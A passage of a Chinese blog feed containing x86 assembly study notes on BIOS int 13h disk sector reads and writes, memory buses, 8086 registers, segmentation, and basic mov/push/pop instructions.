13h</span><br></pre></td></tr></table></figure></li><li><p><strong>返回参数</strong></p><ul><li>操作成功：(ah)&#x3D;0,(al)&#x3D;读入的扇面数</li><li>操作失败：(ah)&#x3D;出错代码</li></ul></li></ol><p>写入0面0道1扇面的内容到0:200</p><ol><li><p><strong>入口参数</strong></p><ul><li><p>(ah)&#x3D;int 13h的功能号(3表示读扇区)</p></li><li><p>(al)&#x3D;写入的扇区数</p></li><li><p>(ch)&#x3D;磁道号</p></li><li><p>(cl)&#x3D;扇区号</p></li><li><p>(dh)&#x3D;磁头号(对于软驱即面号，因为一个面用一个磁头来读写)</p><ul><li>(dl)&#x3D;驱动器号<ul><li>软驱从0开始，0:软驱A，1:软驱B</li><li>硬盘从80h开始，80h:硬盘C，81h:硬盘D</li></ul></li></ul></li><li><p>es:bx指向接收此扇区写入数据的内存区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,200h</span><br><span class="line">mov al,1</span><br><span class="line">mov ch,0</span><br><span class="line">mov cl,1</span><br><span class="line">mov dl,0</span><br><span class="line">mov dh,0</span><br><span class="line">mov ah,3</span><br><span class="line">int 13h</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>返回参数</strong></p><ul><li>操作成功：(ah)&#x3D;0,(al)&#x3D;写入的扇面数</li><li>操作失败：(ah)&#x3D;出错代码</li></ul></li></ol><p><strong>注意</strong></p><p>下面我们要使用int 13h 中断例程对软盘进行读写。直接向磁盘扇区写入数据是很危险的，很可能覆盖掉重要的数据。</p><p>如果向软盘的0 面0 道1 扇区中写入了数据，要使软盘在现有的操作系统下可以使用，必须要重新格式化。</p><ul><li>在编写相关的程序之前，必须要找一张空闲的软盘。在使用int 13h中断例程时一定要注意驱动器号是否正确，千万不要随便对硬盘中的扇区进行写入。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 汇编语言学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X86汇编语言学习笔记1</title>
      <link href="/2024/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
      <url>/2024/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编语言学习笔记1"><a href="#汇编语言学习笔记1" class="headerlink" title="汇编语言学习笔记1"></a>汇编语言学习笔记1</h1><h2 id="了解汇编语言"><a href="#了解汇编语言" class="headerlink" title="了解汇编语言"></a>了解汇编语言</h2><p>本词条由<a href="https://baike.baidu.com/science">“科普中国”科学百科词条编写与应用工作项目 </a>审核 。</p><p>汇编语言（Assembly Language）是任何一种用于电子<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA/140338?fromModule=lemma_inlink">计算机</a>、<a href="https://baike.baidu.com/item/%E5%BE%AE%E5%A4%84%E7%90%86%E5%99%A8/104320?fromModule=lemma_inlink">微处理器</a>、<a href="https://baike.baidu.com/item/%E5%BE%AE%E6%8E%A7%E5%88%B6%E5%99%A8/6688343?fromModule=lemma_inlink">微控制器</a>或其他可编程器件的低级语言，亦称为<a href="https://baike.baidu.com/item/%E7%AC%A6%E5%8F%B7%E8%AF%AD%E8%A8%80/15718762?fromModule=lemma_inlink">符号语言</a>。在汇编语言中，用<a href="https://baike.baidu.com/item/%E5%8A%A9%E8%AE%B0%E7%AC%A6/489287?fromModule=lemma_inlink">助记符</a>代替<a href="https://baike.baidu.com/item/%E6%9C%BA%E5%99%A8%E6%8C%87%E4%BB%A4/8553126?fromModule=lemma_inlink">机器指令</a>的<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%A0%81/3220418?fromModule=lemma_inlink">操作码</a>，用地址符号或<a href="https://baike.baidu.com/item/%E6%A0%87%E5%8F%B7/7680733?fromModule=lemma_inlink">标号</a>代替指令或<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0/7658270?fromModule=lemma_inlink">操作数</a>的地址。在不同的设备中，汇编语言对应着不同的<a href="https://baike.baidu.com/item/%E6%9C%BA%E5%99%A8%E8%AF%AD%E8%A8%80/2019225?fromModule=lemma_inlink">机器语言</a><a href="https://baike.baidu.com/item/%E6%8C%87%E4%BB%A4%E9%9B%86/238130?fromModule=lemma_inlink">指令集</a>，通过汇编过程转换成机器指令。特定的汇编语言和特定的机器语言指令集是<a href="https://baike.baidu.com/item/%E4%B8%80%E4%B8%80%E5%AF%B9%E5%BA%94/18877366?fromModule=lemma_inlink">一一对应</a>的，不同平台之间不可直接移植。</p><p>汇编语言是直接在硬件之上工作的编程语言，首先要了解硬件系统的结构，才能有效的应用汇编语言对其编程。</p><h2 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1. 基本原理"></a>1. 基本原理</h2><h3 id="1-1机器语言"><a href="#1-1机器语言" class="headerlink" title="1.1机器语言"></a>1.1机器语言</h3><p>机器语言是机器指令的集合</p><p>01010100001001</p><p>机器指令展开来讲就是一台机器可以正确执行的命令</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715173354279-17413513546312.png" alt="image-20240715173354279"></p><h3 id="1-2汇编语言的产生"><a href="#1-2汇编语言的产生" class="headerlink" title="1.2汇编语言的产生"></a>1.2汇编语言的产生</h3><ol><li><p>汇编语言的主体是汇编指令</p></li><li><p>汇编指令和机器指令的差别在于指令的表示方法上，汇编指令是机器指令便于记忆和书写格式</p></li><li><p>汇编指令是机器指令的助记符</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715174057908.png" alt="image-20240715174057908"></p><p>寄存器：简单的讲是cpu中可以存储数据的器件，一个cpu中有多个寄存器。AX是其中一个寄存器的代号。</p><p>BX是另一个寄存器的代号。</p><h3 id="1-3汇编语言的组成"><a href="#1-3汇编语言的组成" class="headerlink" title="1.3汇编语言的组成"></a>1.3汇编语言的组成</h3><p>汇编语言由以下3类组成</p><ol><li>汇编指令（机器码的助记符）</li><li>伪指令（由编译器执行）</li><li>其他指令（由编译器识别）</li></ol><p>汇编语言的核心是汇编指令，他决定了汇编语言的特征</p><h3 id="1-4存储器"><a href="#1-4存储器" class="headerlink" title="1.4存储器"></a>1.4存储器</h3><ol><li><p>cpu是计算机的核心部件，他控制整个计算机的运行并运算，要想让一个cpu工作，就必须向他提供指令和数据。</p></li><li><p>指令和数据在存储器中存放，也就是平时说的内存</p></li><li><p>一台pc中内存的作用仅次于cpu</p></li><li><p>离开了内存，性能再好的cpu也无法工作</p></li><li><p>磁盘不同于内存，磁盘上的数据或程序如果不读到内存中，就无法被cpu使用</p></li></ol><h3 id="1-5指令和数据"><a href="#1-5指令和数据" class="headerlink" title="1.5指令和数据"></a>1.5指令和数据</h3><ol><li>指令和数据是应用的概念</li><li>在内存或磁盘，指令和数据没有任何区别，都是二进制信息</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715180657355.png" alt="image-20240715180657355"></p><h3 id="1-6存储单元"><a href="#1-6存储单元" class="headerlink" title="1.6存储单元"></a>1.6存储单元</h3><ol><li><p>存储器被划分为若干个存储单元，每个存储单元从0开始顺序编号</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715181135676.png" alt="image-20240715181135676"></p></li><li><p>对于大容量的存储器一般还用以下单位来计算容量（以下用B来代替byte）</p></li></ol><ul><li>1KB&#x3D;1024B</li><li>1MB&#x3D;1024KB</li><li>1GB&#x3D;1024MB</li><li>1TB&#x3D;1024GB</li></ul><ol start="3"><li><p>磁盘的容量单位同内存的一样，实际上以上的单位是微机中常见的计量单位</p></li><li><p>cpu想要进行数据的读写，必须和外部器件（标准的说法是芯片）进行三类信息的交互</p><ul><li>存储单元的地址（地址信息）</li><li>器件的选择，都或写命令（控制信息）</li><li>读或写的数据（数据信息）</li></ul></li><li><p>电子计算机能处理，传输的信息都是电信号，电信号当然要用导线传</p></li></ol><h3 id="1-7cpu对存储器的读写"><a href="#1-7cpu对存储器的读写" class="headerlink" title="1.7cpu对存储器的读写"></a>1.7cpu对存储器的读写</h3><ol><li><p>在计算机中专门有连接cpu和其他芯片的导线，通常称为总线</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715182638864.png" alt="image-20240715182638864"></p></li></ol><h3 id="1-8地址总线"><a href="#1-8地址总线" class="headerlink" title="1.8地址总线"></a>1.8地址总线</h3><ul><li>地址总线（Address Bus）的主要任务是传输内存地址或外部设备的地址信息。地址总线是单向的，即信息只能从CPU流向内存或I&#x2F;O设备，不能反向流动。地址总线的数量决定了系统可以访问的内存范围大小，例如，一个具有24根地址线的系统可以管理的最大内存空间是16MB。</li></ul><ol><li>cpu是通过地址总线来指定存储单元的</li><li>地址总线上能传送多少个不同的信息，cpu就可以对多少个存储单元进行寻址</li><li>一个cpu有N根地址总线，则可以说这个cpu的地址总线的宽度为N</li><li>这样的cpu最多可以寻找2的N次方个内存单元</li></ol><h3 id="1-9数据总线"><a href="#1-9数据总线" class="headerlink" title="1.9数据总线"></a>1.9数据总线</h3><ul><li>数据总线（Data Bus）主要负责在系统内部各个部件之间传输数据。数据总线是双向的，意味着它既可以向一个方向传输数据，也可以从相反方向接收数据。数据总线的宽度（即数据线的数量）直接反映了计算机的数据处理能力，例如，具有32根数据线的计算机被称为32位机，具有64根数据线的计算机则被称为64位机。</li></ul><ol><li><p>cpu与内存或其他器件之间的数据传送是通过数据总线来进行的</p></li><li><p>数据总线的宽度决定了cpu和外界的数据传送速度</p></li></ol><h3 id="1-10控制总线"><a href="#1-10控制总线" class="headerlink" title="1.10控制总线"></a>1.10控制总线</h3><ul><li>控制总线（Control Bus）则负责传输控制信号和命令，指挥计算机的各项操作。控制总线包括多种控制信号线，有些是单向的，有些是双向的。控制总线的功能是实现CPU与外部设备或其他部件之间的协调和控制，确保计算机系统的各个部分能够按照指令进行工作。</li></ul><ol><li><p>cpu对外部器件的控制是通过控制总线来进行的。在这里控制总线是一个总称，控制总线是一些不同控制线的集合</p></li><li><p>有多少根控制总线，就意味着cpu提供了对外部器件的多少种控制。所以，控制总线的宽度决定了cpu对外部器件的控制能力</p></li><li><p>控制总线发送控制信息</p></li></ol><h3 id="1-11内存地址空间"><a href="#1-11内存地址空间" class="headerlink" title="1.11内存地址空间"></a>1.11内存地址空间</h3><ol><li>一个cpu的地址线宽度为10，那么可以寻址1024个内存单元，这1024个可寻到的内存单元就构成这个cpu的内存地址空间</li></ol><h3 id="1-12主板"><a href="#1-12主板" class="headerlink" title="1.12主板"></a>1.12主板</h3><ol><li>在每一台pc上都有一个主板，主板上有核心器件和一些主要器件（cpu，内存….）</li><li>这些器件通过总线（地址总线，数据总线，控制总线）相连</li></ol><h3 id="1-13接口卡"><a href="#1-13接口卡" class="headerlink" title="1.13接口卡"></a>1.13接口卡</h3><ol><li>计算机系统中，所有可用程序控制其工作的设备，必须受到cpu的控制</li><li>cpu对外部设备不能直接控制，如显示器，音响，打印机等。直接控制这些设备进行工作的是插在扩展插槽上的接口卡</li></ol><h3 id="1-14-各类存储器芯片"><a href="#1-14-各类存储器芯片" class="headerlink" title="1.14 各类存储器芯片"></a>1.14 各类存储器芯片</h3><ol><li><p>从读写属性上看分为两类</p><p>随机存储器（RAM）和只读存储器（ROM）</p></li><li><p>从功能和连接上分类：</p><ol><li><p>随机存储器RAM</p></li><li><p>装有BOIS的ROM</p></li><li><p>接口卡上的RAM</p><ol><li>装有BIOS的ROM</li></ol><p>BOIS:Basic Input&#x2F;Output System,基本输入输出系统。</p><p>BOIS是由主板和各类接口卡（如：显卡，网卡等）厂商提供软件系统，可以通过他利用该硬件设备进行最基本的输入输出。在主板和某些接口卡上插有存储相应BOIS的ROM</p></li></ol></li><li><p>pc机中各类存储器的逻辑连接情况</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715223128415.png" alt="image-20240715223128415"></p><h3 id="1-15-内存地址空间"><a href="#1-15-内存地址空间" class="headerlink" title="1.15 内存地址空间"></a>1.15 内存地址空间</h3><ol><li><p>上述的哪些存储器在物理上是独立的器件</p></li><li><p>但是他们在以下两点上相同：</p><ol><li>都与cpu的总线相连</li><li>cpu对他们进行读或写的时候都通过控制线发出内存读写命令</li></ol></li><li><p>将各各类存储器看作一个逻辑存储器：</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240715223825329.png" alt="image-20240715223825329"></p></li></ol><p>8086PC机的内存地址空间分配</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715224345933.png" alt="image-20240715224345933"></p><ol start="4"><li>内存地址空间：<ul><li>最终运行程序的是cpu，我们用汇编编程的时候，必须要从cpu角度考虑问题</li><li>对cpu来讲，系统中的所有存储器中的存储的单元都处于一个统一的逻辑存储器中，他的容量受cpu寻址能力的限制。这个给逻辑存储器即是我们所说的内存地址空间</li></ul></li></ol><h2 id="2-寄存器（cpu工作原理）"><a href="#2-寄存器（cpu工作原理）" class="headerlink" title="2 寄存器（cpu工作原理）"></a>2 寄存器（cpu工作原理）</h2><p><strong>cpu概述</strong></p><p>一个典型的cpu由计算器，控制器，寄存器等器件组成，这些器件靠内部总线相连</p><p>区别</p><ul><li>内部总线实现cpu内部各器件之间的联系</li><li>外部总线实现cpu和主板上其他器件的联系</li></ul><p><strong>寄存器概述</strong></p><p>8086cpu有14个寄存器 他们的名称为：AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p><p>其中通用寄存器有八个，随着cpu核的增加会增加寄存器但是通用的基本不会改变</p><h3 id="2-1通用寄存器"><a href="#2-1通用寄存器" class="headerlink" title="2.1通用寄存器"></a>2.1通用寄存器</h3><ol><li><p>8086cpu所有的寄存器都是16位的，可以存放两个字节</p></li><li><p>AX,BX,CX,DX 通常用来存放一般性数据被称为通用寄存器</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240715232814328.png" alt="image-20240715232814328"></p></li><li><p>一个16位寄存器可以存储一个16位的数据。（数据的存放情况）</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715233027336.png" alt="image-20240715233027336"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715233048026.png" alt="image-20240715233048026"></p><p>一个16位的寄存器所能存储的数据的最大值是2的16次方减一（提示：从0开始）</p><ol start="4"><li><p>8086上一代cpu中的寄存器都是8位的；</p></li><li><p>为了保证兼容性，这四个寄存器都可以分为两个独立的8位寄存器使用</p></li></ol><ul><li>AX可以分为AH和AL;(height和low)</li><li>BX可以分为BH和BL；</li><li>CX…..</li><li>DX…..</li></ul><ol start="6"><li><p>AX的低八位（0<del>7）构成了AL寄存器，高八位（8</del>15）构成AH寄存器</p></li><li><p>AH和AL寄存器是可以独立使用的8位寄存器</p></li><li><p>8086cpu的8位寄存器数据存储情况</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240715234819187.png" alt="image-20240715234819187"></p></li></ol><h3 id="2-2-字（word）在寄存器中的存储"><a href="#2-2-字（word）在寄存器中的存储" class="headerlink" title="2.2 字（word）在寄存器中的存储"></a>2.2 字（word）在寄存器中的存储</h3><ol><li><p>一个字可以存在一个16位寄存器中，这个字的高位字节和低位字节自然就存在这个寄存器的高8位寄存器和低8位寄存器</p></li><li><p>关于数制的讨论</p></li></ol><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240715235921681.png" alt="image-20240715235921681"></p><h3 id="2-3-几条汇编指令"><a href="#2-3-几条汇编指令" class="headerlink" title="2.3 几条汇编指令"></a>2.3 几条汇编指令</h3><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716000200249.png" alt="image-20240716000200249"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716001315745.png" alt="image-20240716001315745"></p><p>当进行上述运算数据超过了寄存器的上限会显示后四位，并且会将最大的一位放入进制位</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716001906232.png" alt="image-20240716001906232"></p><p>与上述同理</p><p>这里的丢失，指的是进位制不能再8位寄存器中保存，但是cpu不是并真的不丢弃这个进位值</p><h3 id="2-4物理地址"><a href="#2-4物理地址" class="headerlink" title="2.4物理地址"></a>2.4物理地址</h3><ol><li>cpu访问内存单元时要给内存单元地址。所有的内存单元构成的存储空间时一个一维的线性空间</li><li>我们将这个给唯一的地址称为物理地址</li></ol><h3 id="2-516位结构的cpu"><a href="#2-516位结构的cpu" class="headerlink" title="2.516位结构的cpu"></a>2.516位结构的cpu</h3><p>概括的讲，16位结构描述了一个cpu具体有以下几个方面特征：</p><ul><li>计算机一次最多可以处理16位的数据</li><li>寄存器的最大宽度为16位</li><li>寄存器和运算器之间的通路为16位的</li></ul><h3 id="2-6-8086cpu给出物理地址的方法"><a href="#2-6-8086cpu给出物理地址的方法" class="headerlink" title="2.6 8086cpu给出物理地址的方法"></a>2.6 8086cpu给出物理地址的方法</h3><ol><li><p>8086有20位地址总线，可传送20位地址，寻址能力位1M</p></li><li><p>8086内部位16位结构，他只能传送16位的地址，表现出的寻址能力却只有64K</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716124241339.png" alt="image-20240716124241339"></p><p><strong>地址加法器工作原理</strong></p><p>物理地址&#x3D;段地址*16+偏移地址</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716124709716.png" alt="image-20240716124709716"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716124934616.png" alt="image-20240716124934616"></p><ol><li>一个数据的二进制形式左移一位，相当于该数据乘以2</li><li>一个数据的二进制形式左移N位，相当于该数据乘以2的N次方</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716125255041.png" alt="image-20240716125255041"></p><h3 id="2-7物理地址-段地址-16-偏移地址的本质含义"><a href="#2-7物理地址-段地址-16-偏移地址的本质含义" class="headerlink" title="2.7物理地址&#x3D;段地址*16+偏移地址的本质含义"></a>2.7物理地址&#x3D;段地址*16+偏移地址的本质含义</h3><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716130026964.png" alt="image-20240716130026964"></p><h3 id="2-8-段的概念"><a href="#2-8-段的概念" class="headerlink" title="2.8 段的概念"></a>2.8 段的概念</h3><ol><li><p>错误认识：内存被划分成一个一个的段，每个段有一个段地址</p></li><li><p>其实：内存并没有分段，段的划分来自于cpu，由于8086cpu用（物理地址&#x3D;段地址*16+偏移地址）的方式给出内存单元的物理地址，是的我们可以用分段的方式来管理内存</p></li></ol><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240716130610728.png" alt="image-20240716130610728"></p><p>以后编程时可以根据需要，将若干地址连续的内存单元看作一个段，用段地址*16定位段的起始地址（基础地址），用偏移地址定位段中的内存单元</p><p><strong>注意</strong></p><ol><li>段地址*16必然时16的倍数，所以一个段的起始地址也一定是16的倍数</li><li>编译地址位16位，16位地址的寻址能力为64k，所以一个段的昌都最大为62K</li></ol><p>cpu可以用不同的段地址和偏移地址形成同一个地理地址</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716131817139.png" alt="image-20240716131817139"></p><p>给定一个段地址最多可以定位64k内存单元</p><h3 id="2-9段寄存器"><a href="#2-9段寄存器" class="headerlink" title="2.9段寄存器"></a>2.9段寄存器</h3><ol><li>段寄存器就是提供段地址</li></ol><p>8086cpu有4个段寄存器：CS（代码段寄存器）,DS（数据段寄存器）,SS（堆栈段寄存器）,ES（附加段寄存器）</p><ol start="2"><li><p>当8086cpu要访问内存时，由这4个段寄存器提供内存单元的段地址</p></li><li><p>cs和ip时8086cpu最关键的寄存器，他们指示了cpu当前要读取指令的地址</p><p>cs为代码段寄存器</p><p>ip为指令指针寄存器</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716133422937.png" alt="image-20240716133422937"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716134037310.png" alt="image-20240716134037310"></p><h3 id="2-10-cs和ip"><a href="#2-10-cs和ip" class="headerlink" title="2.10 cs和ip"></a>2.10 cs和ip</h3><ol><li><p>在任何时候，CPU将cs，ip中的内容当作指令的段地址和偏移地址，用他们合成指令的物理地址，到内存中读取指令码，执行</p></li><li><p>如果说，内存中的一段信息曾被CPU执行过的话，那么，他所在的内存单元必然被cs：ip指向过</p></li></ol><h3 id="2-11-修改cs，ip的指令"><a href="#2-11-修改cs，ip的指令" class="headerlink" title="2.11 修改cs，ip的指令"></a>2.11 修改cs，ip的指令</h3><ol><li><p>在cpu中，程序员能够用指令读写的部件只有寄存器，程序员可以通过改变寄存器中的内容实现对cpu的控制</p></li><li><p>cpu从何处执行指令是由cs，ip中的内容来控制cpu执行目标指令</p></li></ol><p>mov指令可以改变8086cpu大部分寄存器的值，被称为转移指令（但不可以改变cs与ip）</p><ol start="3"><li><p>转移指令</p><ol><li><p>同时修改cs，ip的内容：</p><p>jmp 段地址：偏移地址</p><p>功能：用指令中给出的段地址修改cs，偏移地址修改ip</p></li><li><p>仅修改ip的内容</p><p>jmp 某一合法寄存器</p></li></ol></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716140046220.png" alt="image-20240716140046220"></p><p> <strong>cpu运行流程</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716140158454.png" alt="image-20240716140158454"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716140423964.png" alt="image-20240716140423964"></p><h3 id="2-12-代码段"><a href="#2-12-代码段" class="headerlink" title="2.12 代码段"></a>2.12 代码段</h3><ol><li><p>对于8086pc机，在编程时，可以根据需要，将一个组内存单元定义为一个段</p></li><li><p>可以将长度为N（N&lt;&#x3D;64kb）的一组代码，存放在一组地址连续，起始地址为16的倍数的内存单元中，这段内存是用来存放代码的，从而定义了一段代码段</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716160319596.png" alt="image-20240716160319596"></p><ol start="3"><li>将一段内存当作代码段，仅仅时我们在编程时的一种安排，cpu并不会由于这种安排，就自动地将我们定义的代码段中的指令来执行</li><li>cpu只认被cs：ip指定的内存单元中的内容为指令</li><li>所以要将cs：ip指向所定义的代码段中的第一条指令的首地址</li></ol><h2 id="3-寄存器（内存访问）"><a href="#3-寄存器（内存访问）" class="headerlink" title="3 寄存器（内存访问）"></a>3 寄存器（内存访问）</h2><h3 id="3-1-内存中字的存储"><a href="#3-1-内存中字的存储" class="headerlink" title="3.1 内存中字的存储"></a>3.1 内存中字的存储</h3><p>从0地址处开始存放20000（4E20H）</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716222546872.png" alt="image-20240716222546872"></p><p>注意：0号单元是低地址单元，1号单元是高地质单元</p><ol><li><p>0地址单元中存放的字节型数据是20</p></li><li><p>0地址字单元中存放的字型数据是4E20</p></li><li><p>2地址字单位中存放的字节型数据是12</p></li><li><p>2地址单元中存放的字型数据是0012</p></li><li><p>1地址字但与那中存放的字型数据是 124E</p></li></ol><p><strong>字型数据和字节型数据的区别</strong></p><p>一、指代不同</p><p>1、字节型数据：是计算机信息技术用于计量存储容量的一种计量单位，作为一个单位来处理的一个二进制数字串，是构成信息的一个小单位。</p><p>2、字型数据：是其用来一次性处理事务的一个固定长度的位（bit）组。</p><p>二、长度不同</p><p>1、字节型数据：是二进制数据的单位。一个字节8位长。</p><p>2、字型数据：拥有10位或者12位的十进制数字作为字长，还有一些早期的计算机根本就没有固定字长。</p><p><a href="https://iknow-pic.cdn.bcebos.com/0823dd54564e92584a1c499f9382d158ccbf4e93"><img src="https://iknow-pic.cdn.bcebos.com/0823dd54564e92584a1c499f9382d158ccbf4e93?x-bce-process=image/resize,m_lfit,w_600,h_800,limit_1/quality,q_85/format,f_auto" alt="img"></a></p><p>三、特点不同</p><p>1、字节型数据：用一个字节（Byte）储存，可区别256个数字，取值范围：0到255。 Byte是从0-255的无符号类型，所以不能表示负数。</p><p>2、字型数据：计算机处理的典型数值也可能是以字长为单位。CPU和内存之间的数据传送单位也通常是一个字长。还有而内存中用于指明一个存储位置的地址也经常是以字长为单位的。</p><p><strong>结论</strong></p><p>任何两个地址连续的内存单元，N号单元和N+1号单元，可以将他们看成两个内存单元，也可以看成一个地址为N的字单元中的高位字节单元和低位字节单元</p><h3 id="3-2-DS和-address"><a href="#3-2-DS和-address" class="headerlink" title="3.2 DS和[address]"></a>3.2 DS和[address]</h3><ol><li><p>cpu要读取一个内存单元的时候，必须先给出这个内存单元的地址</p></li><li><p>在8086pc中，内存地址由段地址和偏移地址组成</p></li><li><p>8086cpu中有一个DS寄存器，通常用来存放要访问的数据的段地址</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov 寄存器，数据</span><br><span class="line">mov 寄存器，寄存器</span><br><span class="line">mov 寄存器，[...]\\[...]表示一个内存单元，[...]中的数据表示内存单元的偏移地址</span><br></pre></td></tr></table></figure><ol start="4"><li>执行指令时，8086cpu自动取DS中的数据为内存单元的段地址</li></ol><p><strong>注意</strong></p><p>不可以直接将数据送入段寄存器 只能通过通用寄存器（硬件设计的问题）</p><p>数据-&gt;通用寄存器-&gt;段寄存器</p><h3 id="3-3-字的传送"><a href="#3-3-字的传送" class="headerlink" title="3.3 字的传送"></a>3.3 字的传送</h3><p>因为8086cpu是16位结构，有16根数据线，所以，可一次性传送16位的数据，也就是一次性传送一个字</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716234039206.png" alt="image-20240716234039206"></p><h3 id="3-4-mov，add，sub指令"><a href="#3-4-mov，add，sub指令" class="headerlink" title="3.4 mov，add，sub指令"></a>3.4 mov，add，sub指令</h3><p><strong>mov</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,数据//将数据存入寄存器</span><br><span class="line">mov ax,bx//将寄存器数据存入寄存器</span><br><span class="line">mov ax,[...]//将内存单元存入寄存器</span><br><span class="line">mov [...],ax//将寄存器数据存入内存单元</span><br><span class="line">mov ds,ax//将内存其数据存入段寄存器</span><br><span class="line">mov ax,dx//将段寄存器数据存入寄存器</span><br></pre></td></tr></table></figure><p><strong>add和sub</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717105914344.png" alt="image-20240717105914344"></p><h3 id="3-5-数据段"><a href="#3-5-数据段" class="headerlink" title="3.5 数据段"></a>3.5 数据段</h3><ol><li><p>我们可以根据需要将一组内存单元定义为一个段（可以是代码段，数据段）</p></li><li><p>我们可以将一组长度为N（N&lt;&#x3D;64K）,地址连续，起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段</p></li></ol><p> <img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717111350669.png" alt="image-20240717111350669"></p><h3 id="3-6-栈"><a href="#3-6-栈" class="headerlink" title="3.6 栈"></a>3.6 栈</h3><ol><li><p>栈是一种具有特殊的访问方式的存储空间。他的特殊性就在于，最后进入这个空间的数据，最先出去</p></li><li><p>栈有两个基本的操作：入栈的出栈</p><ul><li>入栈：将一个新的元素放到栈顶</li><li>出栈：从栈顶取出一个元素</li></ul></li><li><p>栈顶的元素总是最后入栈，需要出栈是，又最先被从栈中取出</p></li><li><p>栈的操作规则：LIFO</p><p>（Last In First Out，后进先出）</p></li></ol><h3 id="3-7-cpu提供的栈机制"><a href="#3-7-cpu提供的栈机制" class="headerlink" title="3.7 cpu提供的栈机制"></a>3.7 cpu提供的栈机制</h3><ol><li><p>现今的cpu中都有栈的设计。</p></li><li><p>8086cpu提供相关的指令来以栈的方式访问内存空间</p></li><li><p>这意味着，我们在基于8086cpu编程的时候，可以将一段内存当作栈来使用</p></li><li><p>8086cpu提供入栈和出栈指令：（最基本的）</p><p>PUSH（入栈）</p><p>POP（出栈）</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ax//将寄存器ax中的数据送入栈中</span><br><span class="line">pop ax//从栈顶取出数据送入ax</span><br></pre></td></tr></table></figure><ol start="5"><li><p>8086cpu的入栈和出栈操作都是以字为单位进行的</p></li><li><p>寄存器cs和ip中存放着当前指令的段地址和偏移地址</p><p>8086cpu中，有两个寄存器:</p><p>​    段寄存器SS 存放栈顶的段地址</p><p>​    寄存器SP 存放栈顶的偏移地址</p><p>任何时刻，SS：SP指向栈顶元素</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717120732595.png" alt="image-20240717120732595"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240717120810169.png" alt="image-20240717120810169"></p><p><img 